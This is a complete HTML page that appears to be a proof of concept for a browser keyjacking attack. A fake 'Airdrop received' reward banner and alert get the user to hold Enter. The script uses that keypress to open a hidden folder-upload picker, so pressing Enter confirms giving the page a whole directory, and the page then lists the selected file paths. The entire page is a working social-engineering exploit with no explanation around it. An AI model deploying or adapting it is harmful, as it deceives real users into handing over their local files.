<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Directory File Upload</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        #fileList {
            margin: 20px;
        }

        input {
            display: none;
        }
    </style>
</head>

<body>
    <center>
        <h1>💸 Airdrop received! Hold Enter for reward! 💸</h1>
    </center>
    <input type="file" id="fileInput" webkitdirectory>
    <div id="fileList"></div>

    <script>


        document.addEventListener('keydown', function (event) {
            if (event.key === 'Enter') {
                event.preventDefault(); // Prevent the default Enter key behavior
                document.getElementById('fileInput').showPicker();
                setTimeout(() => {
                    alert("🎉 Congratulations! You've just won a $100 reward! Press Enter twice to claim your prize!");
            }, 500);
               

            }
        });
        document.getElementById('fileInput').addEventListener('change', function (event) {
            const fileList = document.getElementById('fileList');
            fileList.innerHTML = ''; // Clear previous file list

            const files = event.target.files;
            if (files.length === 0) {
                fileList.innerHTML = 'No files selected.';
                return;
            }

            const ul = document.createElement('ul');
            for (const file of files) {
                const li = document.createElement('li');
                li.textContent = file.webkitRelativePath; // Display relative path
                ul.appendChild(li);
            }
            fileList.appendChild(ul);
        });
    </script>
</body>

</html>
